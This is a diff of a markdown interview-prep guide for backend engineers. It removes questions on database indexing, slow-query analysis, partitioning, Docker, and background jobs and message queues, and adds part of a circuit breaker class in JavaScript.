-| Write performance | Slower (page splits when inserting out of order) | Faster inserts (no physical reordering) |
-| Default | Usually primary key becomes clustered index | All other indexes |
-
-**Visual:**
-
-```
-Clustered Index (Primary Key = id):
-Physical disk pages:
-Page 1: [row id=1][row id=2][row id=3][row id=4]
-Page 2: [row id=5][row id=6][row id=7][row id=8]
-→ SELECT * FROM users WHERE id BETWEEN 3 AND 6 reads 2 contiguous pages ✅
-
-Non-Clustered Index (on email):
-Index B-Tree:
-  alice@... → pointer to Page 3, Row 12
-  bob@...   → pointer to Page 1, Row 2
-  carol@... → pointer to Page 7, Row 45
-→ Each email lookup = index scan + heap fetch (extra I/O)
-```
-
-**PostgreSQL note:** PostgreSQL uses **heaps** — all indexes are non-clustered by default. You can use `CLUSTER` command to physically reorder once, but it's not maintained automatically. Use a **Brin index** for naturally ordered data (timestamps).
-
-**SQL Server / MySQL InnoDB:** Primary key is always clustered — choose it wisely (UUID as PK = random inserts = page splits = slower writes).
-
-```sql
--- ✅ Good clustered key: sequential, narrow
-CREATE TABLE orders (
-  id BIGINT AUTO_INCREMENT PRIMARY KEY, -- clustered in InnoDB, sequential = fast inserts
-  ...
-);
-
--- ❌ Bad clustered key: UUID is random, causes page splits
-CREATE TABLE orders (
-  id UUID DEFAULT gen_random_uuid() PRIMARY KEY, -- random = fragmentation
-  ...
-);
-```
-
-> 📖 Reference: [Clustered vs Non-Clustered Index — GeeksForGeeks](https://www.geeksforgeeks.org/difference-between-clustered-and-non-clustered-index/)
-
----
-
-**Q23. How do you identify slow queries in production? What tools or techniques do you use?**
-
-**Answer:**
-
-**Step 1 — Enable slow query logging:**
-
-```sql
--- PostgreSQL: postgresql.conf
-log_min_duration_statement = 500   -- log queries slower than 500ms
-log_duration = on
-log_statement = 'all'              -- or 'ddl', 'mod', 'none'
-
--- MySQL: my.cnf
-slow_query_log = 1
-long_query_time = 0.5
-slow_query_log_file = /var/log/mysql/slow.log
-log_queries_not_using_indexes = 1
-```
-
-**Step 2 — Analyze slow query log:**
-
-```bash
-# MySQL: use pt-query-digest (Percona Toolkit)
-pt-query-digest /var/log/mysql/slow.log | head -100
-# Shows: query count, total time, avg time, worst queries
-
-# PostgreSQL: use pgBadger
-pgbadger /var/log/postgresql/postgresql.log -o report.html
-# Beautiful HTML report with top slow queries, lock waits, errors
-```
-
-**Step 3 — Check pg_stat_statements (PostgreSQL):**
-
-```sql
--- Enable extension
-CREATE EXTENSION IF NOT EXISTS pg_stat_statements;
-
--- Top 10 slowest queries by total time
-SELECT
-  query,
-  calls,
-  total_exec_time / 1000 AS total_sec,
-  mean_exec_time / 1000  AS avg_sec,
-  rows,
-  100.0 * shared_blks_hit / nullif(shared_blks_hit + shared_blks_read, 0) AS cache_hit_pct
-FROM pg_stat_statements
-ORDER BY total_exec_time DESC
-LIMIT 10;
-
--- Queries causing the most I/O
-SELECT query, shared_blks_read + shared_blks_written AS total_io
-FROM pg_stat_statements
-ORDER BY total_io DESC
-LIMIT 10;
-```
-
-**Step 4 — EXPLAIN ANALYZE the slow query:**
-
-```sql
-EXPLAIN (ANALYZE, BUFFERS, FORMAT TEXT)
-SELECT u.name, COUNT(o.id) as order_count
-FROM users u
-JOIN orders o ON u.id = o.user_id
-WHERE u.created_at > NOW() - INTERVAL '30 days'
-GROUP BY u.id
-ORDER BY order_count DESC
-LIMIT 20;
-
--- Look for:
--- Seq Scan on large table → add index
--- Hash Join with large hash → may need index on join column
--- "Rows Removed by Filter: 99999" → index not filtering well
--- high "Buffers: shared hit=0 read=50000" → poor cache hit rate
-```
-
-**APM tools for production:**
-- **Datadog / New Relic / Dynatrace** — auto-capture slow queries, show flamegraphs, correlate with traces.
-- **PgHero / Adminer** — lightweight DB dashboards.
-- **Scout APM** — good for Rails/Django apps.
-
-> 📖 Reference: [Slow Query Log — MySQL Docs](https://dev.mysql.com/doc/refman/8.0/en/slow-query-log.html)
-
----
-
-**Q24. What is database partitioning? What is the difference between horizontal and vertical partitioning?**
-
-**Answer:**
-
-**Partitioning** splits a large table into smaller, more manageable pieces to improve query performance, maintenance, and scalability.
-
-**Horizontal Partitioning (Sharding):** Split rows across partitions based on a partition key.
-
-```sql
--- PostgreSQL: partition orders by year (range partitioning)
-CREATE TABLE orders (
-  id         BIGSERIAL,
-  user_id    INT,
-  total      DECIMAL,
-  created_at TIMESTAMP
-) PARTITION BY RANGE (created_at);
-
--- Create yearly partitions
-CREATE TABLE orders_2022 PARTITION OF orders
-  FOR VALUES FROM ('2022-01-01') TO ('2023-01-01');
-
-CREATE TABLE orders_2023 PARTITION OF orders
-  FOR VALUES FROM ('2023-01-01') TO ('2024-01-01');
-
-CREATE TABLE orders_2024 PARTITION OF orders
-  FOR VALUES FROM ('2024-01-01') TO ('2025-01-01');
-
--- Query automatically targets only the 2024 partition (partition pruning)
-SELECT * FROM orders WHERE created_at >= '2024-01-01';
--- Only scans orders_2024, not 2022 or 2023 ✅
-
--- Hash partitioning (by user_id — distribute evenly)
-CREATE TABLE users PARTITION BY HASH (id);
-CREATE TABLE users_0 PARTITION OF users FOR VALUES WITH (MODULUS 4, REMAINDER 0);
-CREATE TABLE users_1 PARTITION OF users FOR VALUES WITH (MODULUS 4, REMAINDER 1);
-CREATE TABLE users_2 PARTITION OF users FOR VALUES WITH (MODULUS 4, REMAINDER 2);
-CREATE TABLE users_3 PARTITION OF users FOR VALUES WITH (MODULUS 4, REMAINDER 3);
-```
-
-**Vertical Partitioning:** Split columns across tables based on access patterns.
-
-```sql
--- ❌ All columns in one table (cold columns slow down hot queries)
-CREATE TABLE users (
-  id           INT PRIMARY KEY,
-  email        VARCHAR(255),   -- hot: accessed on every login
-  name         VARCHAR(100),   -- hot: displayed everywhere
-  avatar_url   TEXT,           -- medium: accessed on profile views
-  bio          TEXT,           -- cold: rarely accessed
-  preferences  JSONB,          -- cold: only on settings page
-  last_login   TIMESTAMP       -- medium
-);
-
--- ✅ Vertically partitioned
-CREATE TABLE users (            -- hot columns — small row = more rows per page
-  id    INT PRIMARY KEY,
-  email VARCHAR(255),
-  name  VARCHAR(100),
-  last_login TIMESTAMP
-);
-
-CREATE TABLE user_profiles (    -- cold columns — separate table, JOIN only when needed
-  user_id    INT PRIMARY KEY REFERENCES users(id),
-  bio        TEXT,
-  preferences JSONB,
-  avatar_url TEXT
-);
-```
-
-> 📖 Reference: [DB Partitioning — AWS](https://aws.amazon.com/what-is/database-sharding/)
-
----
-
-## 4. Docker & Containerization
-
----
-
-**Q25. What is a Docker container? How is it different from a virtual machine?**
-
-**Answer:**
-
-| | Container | Virtual Machine |
-|--|-----------|----------------|
-| What it virtualizes | OS process isolation | Entire hardware (CPU, RAM, disk) |
-| Startup time | Milliseconds | Minutes |
-| Size | MBs | GBs |
-| OS | Shares host OS kernel | Own full OS kernel |
-| Isolation | Process-level | Hardware-level |
-| Performance overhead | Minimal (~1%) | Significant (~5–20%) |
-| Use case | App packaging, microservices | Full OS isolation, legacy apps |
-
-```
-Virtual Machine:                    Container:
-┌─────────────────────────┐        ┌─────────────────────────┐
-│  App A    │  App B      │        │  App A    │  App B      │
-│  Libs     │  Libs       │        │  Libs     │  Libs       │
-│  Guest OS │  Guest OS   │        ├───────────────────────── │
-│  (Ubuntu) │  (CentOS)   │        │     Docker Engine        │
-├───────────────────────── │        │     Host OS Kernel       │
-│   Hypervisor (VMware)   │        ├─────────────────────────┤
-│   Host OS               │        │   Host Hardware          │
-│   Hardware              │        └─────────────────────────┘
-└─────────────────────────┘
-Each VM: 2GB+ RAM,              Each container: 50MB, starts
-starts in 1-2 minutes           in <1 second, shares kernel
-```
-
-**Containers use Linux kernel features:**
-- **Namespaces** — isolate processes, networking, filesystem.
-- **cgroups** — limit CPU, memory, I/O per container.
-- **Union filesystems** — layers shared between containers.
-
-> 📖 Reference: [Containers vs VMs — Docker Docs](https://www.docker.com/resources/what-container/)
-
----
-
-**Q26. What is a Dockerfile? Explain common instructions: `FROM`, `RUN`, `COPY`, `CMD`, `EXPOSE`, `ENV`.**
-
-**Answer:**
-
-A **Dockerfile** is a text file of instructions that Docker reads to build an image layer by layer.
-
-```dockerfile
-# ── FROM: base image (always first) ─────────────────────────────────
-FROM node:20-alpine
-# node:20-alpine = Node.js 20 on Alpine Linux (~5MB vs Ubuntu's ~70MB)
-# Always pin a specific version — never use 'latest' in production
-
-# ── ENV: set environment variables ───────────────────────────────────
-ENV NODE_ENV=production
-ENV PORT=3000
-# Available at build time AND runtime inside the container
-
-# ── WORKDIR: set working directory ───────────────────────────────────
-WORKDIR /app
-# Creates /app if it doesn't exist; all subsequent commands run here
-
-# ── COPY: copy files from host into image ────────────────────────────
-COPY package.json package-lock.json ./
-# Copy package files FIRST (before source code)
-# Reason: Docker layer caching — if package files don't change,
-# the npm install layer is reused on rebuilds ✅
-
-# ── RUN: execute command during BUILD ────────────────────────────────
-RUN npm ci --only=production
-# npm ci = faster, reproducible (uses package-lock.json exactly)
-# --only=production = skip devDependencies (smaller image)
-
-COPY . .
-# Copy rest of source code AFTER npm install
-# (source changes don't invalidate the npm install layer)
-
-# ── EXPOSE: document which port the container listens on ─────────────
-EXPOSE 3000
-# This is documentation only — doesn't actually publish the port
-# Port is published with: docker run -p 8080:3000
-
-# ── CMD: default command to run when container starts ────────────────
-CMD ["node", "src/index.js"]
-# JSON array form (preferred) — no shell interpretation
-# Can be overridden: docker run myapp node scripts/migrate.js
-```
-
-**Other important instructions:**
-
-```dockerfile
-# ENTRYPOINT: like CMD but harder to override — for wrapper scripts
-ENTRYPOINT ["./docker-entrypoint.sh"]
-
-# ARG: build-time variable (not available at runtime)
-ARG BUILD_VERSION
-RUN echo "Building version: $BUILD_VERSION"
-# docker build --build-arg BUILD_VERSION=1.2.3 .
-
-# USER: run as non-root user (security best practice)
-RUN addgroup -S appgroup && adduser -S appuser -G appgroup
-USER appuser
-
-# HEALTHCHECK: define container health check
-HEALTHCHECK --interval=30s --timeout=5s --retries=3 \
-  CMD wget -qO- http://localhost:3000/health || exit 1
-```
-
-> 📖 Reference: [Dockerfile Reference — Docker Docs](https://docs.docker.com/engine/reference/builder/)
-
----
-
-**Q27. What is a Docker image vs a Docker container? What is a Docker registry?**
-
-**Answer:**
-
-- **Docker Image:** A read-only template — a snapshot of the filesystem and configuration. Think of it as a class definition or a blueprint. Immutable.
-- **Docker Container:** A running instance of an image. Think of it as an object instantiated from a class. Has its own writable layer on top of the image layers.
-- **Docker Registry:** A storage and distribution service for Docker images (Docker Hub, AWS ECR, GCR, private registries).
-
-```
-Analogy:
-Image   = Class definition (blueprint)
-Container = Object (running instance)
-Registry  = npm registry (stores and distributes images)
-```
-
-```bash
-# ── Working with images ─────────────────────────────────────────────
-docker build -t myapp:1.0.0 .       # build image from Dockerfile
-docker images                        # list all local images
-docker image inspect myapp:1.0.0     # show image metadata and layers
-docker image history myapp:1.0.0     # show layers and sizes
-
-# ── Working with containers ─────────────────────────────────────────
-docker run -d \                      # -d = detached (background)
-  --name my-api \
-  -p 8080:3000 \                     # host:container port mapping
-  -e DATABASE_URL=postgres://... \   # environment variable
-  -e JWT_SECRET=secret \
-  myapp:1.0.0
-
-docker ps                            # list running containers
-docker ps -a                         # include stopped containers
-docker logs my-api                   # view container logs
-docker logs my-api -f                # follow (tail) logs
-docker exec -it my-api sh            # open shell inside running container
-docker stop my-api                   # graceful stop (SIGTERM)
-docker rm my-api                     # delete container
-
-# ── Working with registry ────────────────────────────────────────────
-docker login                         # authenticate with Docker Hub
-docker tag myapp:1.0.0 myuser/myapp:1.0.0   # tag for registry
-docker push myuser/myapp:1.0.0       # push to registry
-
-# On another machine:
-docker pull myuser/myapp:1.0.0       # pull from registry
-docker run myuser/myapp:1.0.0        # run it
-```
-
-> 📖 Reference: [Docker Concepts — Docker Docs](https://docs.docker.com/get-started/overview/)
-
----
-
-**Q28. What is Docker Compose? When would you use it?**
-
-**Answer:**
-
-**Docker Compose** is a tool for defining and running multi-container applications. You describe all services, networks, and volumes in a single `docker-compose.yml` file and start everything with one command.
-
-**When to use it:**
-- Local development (run app + DB + Redis + queue together).
-- Running integration tests in CI.
-- Small deployments (not Kubernetes-scale).
-
-**Complete example for a Node.js API:**
-
-```yaml
-# docker-compose.yml
-version: '3.9'
-
-services:
-
-  # ── Backend API ───────────────────────────────────────────────────
-  api:
-    build: .                         # build from Dockerfile in current directory
-    container_name: my-api
-    ports:
-      - "3000:3000"
-    environment:
-      NODE_ENV:     development
-      DATABASE_URL: postgres://postgres:password@db:5432/myapp
-      REDIS_URL:    redis://redis:6379
-      JWT_SECRET:   dev-secret-change-in-prod
-    depends_on:
-      db:
-        condition: service_healthy   # wait for DB to be ready
-      redis:
-        condition: service_started
-    volumes:
-      - .:/app                       # bind mount source code for hot-reload
-      - /app/node_modules            # don't override node_modules from host
-    command: npm run dev             # override CMD for development
-
-  # ── PostgreSQL ────────────────────────────────────────────────────
-  db:
-    image: postgres:15-alpine
-    container_name: my-db
-    ports:
-      - "5432:5432"
-    environment:
-      POSTGRES_DB:       myapp
-      POSTGRES_USER:     postgres
-      POSTGRES_PASSWORD: password
-    volumes:
-      - postgres_data:/var/lib/postgresql/data    # persist data across restarts
-      - ./db/init.sql:/docker-entrypoint-initdb.d/init.sql  # run on first start
-    healthcheck:
-      test: ["CMD-SHELL", "pg_isready -U postgres"]
-      interval: 5s
-      timeout: 3s
-      retries: 5
-
-  # ── Redis ─────────────────────────────────────────────────────────
-  redis:
-    image: redis:7-alpine
-    container_name: my-redis
-    ports:
-      - "6379:6379"
-    command: redis-server --appendonly yes   # enable persistence
-    volumes:
-      - redis_data:/data
-
-  # ── Background Worker ─────────────────────────────────────────────
-  worker:
-    build: .
-    container_name: my-worker
-    command: node workers/emailWorker.js
-    environment:
-      DATABASE_URL: postgres://postgres:password@db:5432/myapp
-      REDIS_URL:    redis://redis:6379
-    depends_on:
-      - db
-      - redis
-
-volumes:
-  postgres_data:
-  redis_data:
-```
-
-```bash
-# Start everything
-docker compose up -d
-
-# Start only specific services
-docker compose up -d api redis
-
-# View logs from all services
-docker compose logs -f
-
-# Run a command in a service
-docker compose exec api npm run migrate
-
-# Tear down everything (remove containers + networks)
-docker compose down
-
-# Also remove volumes (⚠️ deletes DB data)
-docker compose down -v
-```
-
-> 📖 Reference: [Docker Compose — Docker Docs](https://docs.docker.com/compose/)
-
----
-
-**Q29. What is a multi-stage Docker build? Why is it used to reduce image size?**
-
-**Answer:**
-
-A multi-stage build uses multiple `FROM` instructions in one Dockerfile, where each stage can copy artifacts from previous stages. This lets you use heavy build tools (compilers, TypeScript) without shipping them in the final image.
-
-**Without multi-stage (bad):**
-
-```dockerfile
-FROM node:20                    # 1.1GB base image
-WORKDIR /app
-COPY package*.json ./
-RUN npm ci                       # includes devDependencies (jest, typescript, etc.)
-COPY . .
-RUN npm run build                # compile TypeScript
-CMD ["node", "dist/index.js"]
-# Final image: ~1.2GB 😱
-# Contains: TypeScript, ts-node, jest, eslint, ALL dev tools
-```
-
-**With multi-stage build (optimized):**
-
-```dockerfile
-# ── Stage 1: Builder ─────────────────────────────────────────────────
-FROM node:20-alpine AS builder
-WORKDIR /app
-
-COPY package*.json ./
-RUN npm ci                       # install ALL deps including devDeps
-
-COPY . .
-RUN npm run build                # compile TypeScript → dist/
-RUN npm run test                 # run tests during build
-
-# ── Stage 2: Production image ────────────────────────────────────────
-FROM node:20-alpine AS production
-WORKDIR /app
-
-# Only copy what we need from the builder stage
-COPY package*.json ./
-RUN npm ci --only=production     # install ONLY production deps
-
-COPY --from=builder /app/dist ./dist   # copy compiled code only
-
-# Security: run as non-root
-RUN addgroup -S appgroup && adduser -S appuser -G appgroup
-USER appuser
-
-EXPOSE 3000
-HEALTHCHECK --interval=30s CMD wget -qO- http://localhost:3000/health
-CMD ["node", "dist/index.js"]
-
-# Final image: ~180MB ✅ (vs 1.2GB without multi-stage)
-# Contains: Node.js runtime + compiled JS + prod dependencies only
-# NO TypeScript, jest, source maps, dev tools
-```
-
-**Another example — Go (even more dramatic):**
-
-```dockerfile
-FROM golang:1.22 AS builder          # 800MB
-WORKDIR /app
-COPY . .
-RUN go build -o server ./cmd/server  # compile to single binary
-
-FROM scratch AS production           # empty image (0MB base!)
-COPY --from=builder /app/server /server
-EXPOSE 8080
-CMD ["/server"]
-# Final image: ~10MB (just the binary + SSL certs)
-```
-
-> 📖 Reference: [Multi-stage Builds — Docker Docs](https://docs.docker.com/build/building/multi-stage/)
-
----
-
-**Q30. What are Docker volumes? How do they differ from bind mounts?**
-
-**Answer:**
-
-Both persist data outside a container's writable layer, but they work differently.
-
-| | Volume | Bind Mount |
-|--|--------|-----------|
-| Location | Managed by Docker (`/var/lib/docker/volumes/`) | Specific path on host filesystem |
-| Portability | ✅ High — Docker manages location | ❌ Low — tied to specific host path |
-| Performance | ✅ Better (especially on Mac/Windows) | Slower on non-Linux hosts |
-| Backup | Easy with `docker volume` commands | Manual |
-| Use case | Database data, persistent app data | Source code hot-reload in dev |
-
-```bash
-# ── Named Volume (recommended for data persistence) ──────────────────
-# Docker manages location automatically
-docker run -v postgres_data:/var/lib/postgresql/data postgres:15
-# postgres_data volume lives at /var/lib/docker/volumes/postgres_data
-
-# Volume commands
-docker volume create postgres_data
-docker volume ls
-docker volume inspect postgres_data
-docker volume rm postgres_data
-
-# Backup a volume
-docker run --rm \
-  -v postgres_data:/data \
-  -v $(pwd):/backup \
-  alpine tar czf /backup/postgres_backup.tar.gz /data
-
-# ── Bind Mount (for dev hot-reload) ──────────────────────────────────
-# Maps a specific host directory into the container
-docker run \
-  -v $(pwd)/src:/app/src \       # host path : container path
-  -v /app/node_modules \          # anonymous volume: DON'T bind mount node_modules
-  my-node-app
-
-# In docker-compose.yml:
-volumes:
-  - ./src:/app/src                # bind mount for hot-reload
-  - /app/node_modules             # protect container's node_modules from host override
-```
-
-**Why `-v /app/node_modules` (anonymous volume)?**
-If you bind-mount `.` to `/app`, it overwrites the container's `/app/node_modules` with your (possibly empty or different OS) host `node_modules`. The anonymous volume for `/app/node_modules` takes precedence and protects it.
-
-> 📖 Reference: [Docker Volumes — Docker Docs](https://docs.docker.com/storage/volumes/)
-
----
-
-**Q31. What is a Docker network? How do containers communicate with each other?**
-
-**Answer:**
-
-Docker networks allow containers to communicate securely. By default, containers on the same network can reach each other by **container name** (Docker's internal DNS).
-
-**Network types:**
-
-| Type | Description | Use case |
-|------|------------|---------|
-| `bridge` | Default; isolated network on a single host | Most applications, local dev |
-| `host` | Container shares host's network stack | High-performance, no port mapping |
-| `none` | No network access | Security sandbox |
-| `overlay` | Multi-host networking | Docker Swarm / distributed |
-
-```bash
-# ── Create and use a custom bridge network ───────────────────────────
-docker network create myapp-net
-
-docker run -d --name db \
-  --network myapp-net \
-  -e POSTGRES_PASSWORD=secret \
-  postgres:15
-
-docker run -d --name api \
-  --network myapp-net \
-  -e DATABASE_URL=postgres://postgres:secret@db:5432/myapp \
-  # ↑ "db" resolves to the postgres container's IP automatically
-  myapp:latest
-
-# Containers on the same network talk by name:
-# api container: psql postgresql://postgres:secret@db:5432/myapp  ✅
-# "db" resolves to postgres container's internal IP
-```
-
-```yaml
-# docker-compose.yml — compose handles networking automatically
-services:
-  api:
-    build: .
-    # Compose creates a default network: "myapp_default"
-    # api can reach db as "db:5432"
-
-  db:
-    image: postgres:15
-    # Also on "myapp_default" network automatically
-
-  # Separate private network for internal services
-  internal-service:
-    image: my-internal
-    networks:
-      - internal          # only on internal network — api can't reach it directly
-
-networks:
-  default:                # used by api and db
-  internal:               # used only by internal services
-    driver: bridge
-```
-
-```bash
-# Debug networking
-docker network ls
-docker network inspect myapp-net
-
-# Test connectivity from inside a container
-docker exec -it api sh
-ping db            # should resolve ✅
-curl http://db:5432 # test port connectivity
-```
-
-> 📖 Reference: [Docker Networking — Docker Docs](https://docs.docker.com/network/)
-
----
-
-## 5. Background Jobs & Task Queues
-
----
-
-**Q32. What is a background job? Give 3 real-world examples of when you'd use one.**
-
-**Answer:**
-
-A **background job** is a task that runs asynchronously, outside the request/response cycle. The HTTP request returns immediately while the job is processed independently.
-
-**Why use background jobs:**
-- Long-running tasks would timeout the HTTP request (> 30s).
-- Tasks not needed synchronously (sending emails, generating PDFs).
-- Retry failed tasks without affecting the user.
-- Rate-limit expensive operations (processing 1 image/sec, not 1000/sec).
-
-**3 Real-world examples:**
-
-```js
-const { Queue, Worker } = require('bullmq');
-const redis = { host: 'localhost', port: 6379 };
-
-// ── Example 1: Welcome email after signup ────────────────────────────
-const emailQueue = new Queue('emails', { connection: redis });
-
-// In your signup route:
-app.post('/register', async (req, res) => {
-  const user = await User.create(req.body);
-
-  // ✅ Don't wait for email — respond immediately
-  await emailQueue.add('welcome-email', {
-    userId:    user.id,
-    email:     user.email,
-    firstName: user.firstName
-  });
-
-  res.status(201).json({ message: 'Account created! Check your email.' });
-  // Response: ~50ms (just DB insert)
-  // Email: sent in background within 1-2 seconds
-});
-
-// Email worker (runs separately)
-const emailWorker = new Worker('emails', async (job) => {
-  if (job.name === 'welcome-email') {
-    await sendgrid.send({
-      to:      job.data.email,
-      subject: `Welcome, ${job.data.firstName}!`,
-      html:    welcomeEmailTemplate(job.data)
-    });
-  }
-}, { connection: redis });
-
-// ── Example 2: Image resizing/thumbnail generation ───────────────────
-const imageQueue = new Queue('image-processing', { connection: redis });
-
-app.post('/posts/:id/photo', upload.single('photo'), async (req, res) => {
-  // Save original to S3
-  const s3Key = await uploadToS3(req.file.buffer);
-
-  // ✅ Return immediately — processing happens in background
-  await imageQueue.add('generate-thumbnails', {
-    postId: req.params.id,
-    s3Key,
-    sizes: [{ w: 800, h: 600 }, { w: 400, h: 300 }, { w: 100, h: 100 }]
-  });
-
-  res.json({ message: 'Photo uploaded. Thumbnails generating...' });
-});
-
-// ── Example 3: Monthly invoice generation ────────────────────────────
-const billingQueue = new Queue('billing', { connection: redis });
-
-// Cron: run on 1st of every month
-cron.schedule('0 0 1 * *', async () => {
-  const activeSubscriptions = await getActiveSubscriptions();
-
-  for (const sub of activeSubscriptions) {
-    await billingQueue.add('generate-invoice', {
-      subscriptionId: sub.id,
-      billingPeriod: getCurrentBillingPeriod()
-    }, {
-      attempts: 3,         // retry up to 3 times on failure
-      backoff: { type: 'exponential', delay: 5000 }
-    });
-  }
-});
-```
-
-> 📖 Reference: [Background Jobs — Microsoft Azure Docs](https://learn.microsoft.com/en-us/azure/architecture/best-practices/background-jobs)
-
----
-
-**Q33. What is a message queue? How is it different from a task queue?**
-
-**Answer:**
-
-| | Message Queue | Task Queue |
-|--|--------------|-----------|
-| Purpose | Transport messages between producers and consumers | Execute discrete tasks/jobs by workers |
-| Focus | Message delivery and routing | Job execution, retries, scheduling |
-| Consumer processes | Message immediately | Job is picked up and processed by a worker |
-| Examples | RabbitMQ, AWS SQS, Apache Kafka | BullMQ, Celery, Sidekiq, Temporal |
-| Typical use | Event streaming, microservice communication | Background jobs, scheduled tasks |
-
-```
-Message Queue:
-Producer → [Queue] → Consumer (processes message)
-         → [Queue] → Consumer (multiple consumers possible)
-
-Task Queue:
-Producer (adds job) → [Queue] → Worker (executes job function)
-                              → Worker (another worker)
-```
-
-**Message Queue example (RabbitMQ):**
-
-```js
-// Producer: another service sends a message
-const amqp = require('amqplib');
-const conn = await amqp.connect('amqp://localhost');
-const ch   = await conn.createChannel();
-
-await ch.assertQueue('order-events', { durable: true });
-ch.sendToQueue('order-events',
-  Buffer.from(JSON.stringify({ type: 'ORDER_PLACED', orderId: 99 })),
-  { persistent: true }
-);
-// Just sends a message — doesn't care HOW it's processed
-
-// Consumer: processes the message
-ch.consume('order-events', (msg) => {
-  const event = JSON.parse(msg.content.toString());
-  // Route to appropriate handler
-  if (event.type === 'ORDER_PLACED') handleOrderPlaced(event);
-  ch.ack(msg);
-});
-```
-
-**Task Queue example (BullMQ):**
-
-```js
-// Producer: adds a specific typed job
-const queue = new Queue('image-resize', { connection: redis });
-await queue.add('thumbnail', { imageUrl: 's3://...', width: 200, height: 200 }, {
-  attempts: 3,
-  backoff: { type: 'exponential', delay: 1000 },
-  delay: 5000,      // run 5 seconds from now
-  priority: 10,     // lower number = higher priority
-  repeat: { cron: '0 * * * *' }  // run hourly
-});
-
-// Worker: executes the job
-const worker = new Worker('image-resize', async (job) => {
-  const thumbnail = await resizeImage(job.data.imageUrl, job.data.width, job.data.height);
-  await uploadThumbnail(thumbnail);
-  return { thumbnailUrl: thumbnail.url }; // returned to job result
-}, { connection: redis, concurrency: 5 }); // process 5 jobs simultaneously
-```
-
-> 📖 Reference: [Message Queue vs Task Queue — CloudAMQP](https://www.cloudamqp.com/blog/message-queue-vs-task-queue.html)
-
----
-
-**Q34. What is at-least-once vs at-most-once vs exactly-once delivery in message queues?**
-
-**Answer:**
-
-| | At-Most-Once | At-Least-Once | Exactly-Once |
-|--|-------------|--------------|-------------|
-| What it means | Message delivered 0 or 1 times | Message delivered 1 or more times | Message delivered exactly 1 time |
-| Risk | Message loss | Duplicate processing | None |
-| Performance | Fastest (no acknowledgment) | Fast (ack after processing) | Slowest (transaction coordination) |
-| Complexity | Simple | Simple + handle duplicates | Complex |
-| Use case | Metrics, analytics (loss ok) | Most business events | Financial transactions |
-
-**Code examples:**
-
-```js
-// ── At-Most-Once: fire and forget ────────────────────────────────────
-// If consumer crashes before processing, message is lost
-ch.consume('metrics', (msg) => {
-  ch.ack(msg);         // ack BEFORE processing
-  processMetric(msg);  // if this crashes, message is gone — acceptable for metrics
-});
-
-// ── At-Least-Once: ack after success ─────────────────────────────────
-// If consumer crashes AFTER processing but before ack, message redelivered → duplicate
-ch.consume('order-events', async (msg) => {
-  try {
-    await processOrder(JSON.parse(msg.content)); // process first
-    ch.ack(msg);   // ack AFTER successful processing
-  } catch (err) {
-    ch.nack(msg, false, true); // nack → requeue for retry
-  }
-});
-// Problem: if crash between processOrder and ack → order processed twice!
-// Fix: make processOrder IDEMPOTENT (safe to call twice)
-
-// ── Making at-least-once safe via idempotency ─────────────────────────
-ch.consume('payments', async (msg) => {
-  const { paymentId, amount, userId } = JSON.parse(msg.content);
-
-  // Check if already processed (idempotency check)
-  const existing = await db.query(
-    'SELECT id FROM payment_records WHERE payment_id = ?', [paymentId]
-  );
-
-  if (!existing) {
-    await db.query(
-      'INSERT INTO payment_records (payment_id, amount, user_id) VALUES (?, ?, ?)',
-      [paymentId, amount, userId]
-    );
-    await chargeCard(paymentId, amount);
-  } else {
-    console.log(`Payment ${paymentId} already processed — skipping`);
-  }
-
-  ch.ack(msg); // now safe to ack
-});
-
-// ── Exactly-Once: using Kafka transactions ────────────────────────────
-// Kafka guarantees exactly-once with idempotent producers + transactions
-const { Kafka } = require('kafkajs');
-const kafka = new Kafka({ brokers: ['localhost:9092'] });
-const producer = kafka.producer({ idempotent: true }); // enable idempotency
-await producer.connect();
-
-await producer.transaction(async (txn) => {
-  await txn.send({ topic: 'orders', messages: [{ value: JSON.stringify(order) }] });
-  await txn.sendOffsets({ topics: [{ topic: 'payments', partitions: [...] }] });
-  await txn.commit(); // atomic — both send and commit
-});
-```
-
-> 📖 Reference: [Message Delivery Guarantees — Cloudflare](https://developers.cloudflare.com/queues/reference/delivery-guarantees/)
-
----
-
-**Q35. What is a dead letter queue (DLQ)? Why is it important?**
-
-**Answer:**
-
-A **Dead Letter Queue** is a special queue where messages are sent when they fail to be processed after the maximum number of retries. Instead of losing failed messages or blocking the main queue, they're parked in the DLQ for investigation and manual reprocessing.
-
-```
-Main Queue:
-Message → Worker → fails → retry 1 → fails → retry 2 → fails → retry 3
-                                                                     ↓
-                                                              Dead Letter Queue
-                                                              (message preserved)
-```
-
-**Why it's important:**
-- Failed messages are NOT lost — you can inspect them later.
-- The main queue keeps processing other messages (no blocking).
-- Operations team can investigate why messages failed and replay them.
-- Prevents poison messages from clogging the queue.
-
-**AWS SQS DLQ example:**
-
-```js
-const { SQSClient, SendMessageCommand, ReceiveMessageCommand } = require('@aws-sdk/client-sqs');
-const sqs = new SQSClient({ region: 'us-east-1' });
-
-// SQS queue configured with DLQ (in AWS console or IaC):
-// Main queue: maxReceiveCount = 3
-// After 3 failures → message goes to order-processing-dlq
-
-// Main worker
-async function processOrderQueue() {
-  while (true) {
-    const { Messages } = await sqs.send(new ReceiveMessageCommand({
-      QueueUrl:            process.env.ORDER_QUEUE_URL,
-      MaxNumberOfMessages: 10,
-      WaitTimeSeconds:     20   // long polling
-    }));
-
-    for (const msg of Messages || []) {
-      try {
-        const order = JSON.parse(msg.Body);
-        await processOrder(order);
-        // ✅ Delete on success
-        await sqs.send(new DeleteMessageCommand({
-          QueueUrl:      process.env.ORDER_QUEUE_URL,
-          ReceiptHandle: msg.ReceiptHandle
-        }));
-      } catch (err) {
-        // ❌ Don't delete on failure — SQS will redeliver
-        // After maxReceiveCount failures → AWS moves to DLQ automatically
-        logger.error('Order processing failed', { error: err.message, order: msg.Body });
+  onSuccess() {
+    this.failureCount = 0;
+    if (this.state === 'HALF_OPEN') {
+      this.successCount++;
+      if (this.successCount >= this.successThreshold) {
+        this.state = 'CLOSED';
+        this.successCount = 0;
+        console.log('Circuit CLOSED — service recovered ✅');
       }
+    }
+  }
+
+  onFailure() {
+    this.failureCount++;
+    this.successCount = 0;
+    if (this.state === 'HALF_OPEN' || this.failureCount >= this.failureThreshold) {
+      this.state = 'OPEN';
+      this.nextAttempt = Date.now() + this.timeout;
+      console.log(`Circuit OPEN — ${this.failureCount} failures. Cooling down for ${this.timeout/1000}s`);
     }
   }
 }
 
-// DLQ monitoring and reprocessing
-async function processDLQ() {
-  const { Messages } = await sqs.send(new ReceiveMessageCommand({
-    QueueUrl: process.env.ORDER_DLQ_URL,
-    MaxNumberOfMessages: 10
-  }));
+// Usage: wrap the external call
